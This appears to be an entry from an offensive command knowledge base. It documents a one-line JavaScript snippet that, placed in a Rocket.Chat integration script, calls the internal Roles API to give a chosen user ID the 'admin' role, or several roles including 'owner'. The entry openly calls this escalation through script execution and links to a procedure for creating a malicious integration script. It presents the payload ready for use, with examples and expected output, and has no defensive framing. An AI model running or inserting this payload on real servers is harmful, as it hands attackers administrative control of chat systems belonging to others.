---
id: cmd-addUserRoles-js
data: 'this.Roles.addUserRoles("<USER_ID>", "admin")'
tags:
  - javascript
  - role-add
type: command
output: 'null'
executor: javascript
platforms:
  - Node.js
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:26.952Z'
verified: false
validated: true
submitted: true
---
# addUserRoles-JS-Script

## Command

```javascript
this.Roles.addUserRoles("<USER_ID>", "admin")
```

## Description

This JavaScript snippet, embedded in a Rocket.Chat integration script, adds the 'admin' role to a specified user ID using the internal Roles API, exploiting script execution for escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| userId | The target user's ID (e.g., "9HN4Brdmo2Qc2wsiX") | Yes |
| role | The role to add (e.g., "admin") | Yes |

## Examples

### Basic Usage

```javascript
this.Roles.addUserRoles("9HN4Brdmo2Qc2wsiX", "admin")
```

### Advanced Usage

Add multiple roles: this.Roles.addUserRoles("id", ["admin", "owner"]).

## Expected Output

Silent success (no return value on add); verify via user query showing new role.

## Related

- [[procedures/Create-Malicious-Integration-Script]]
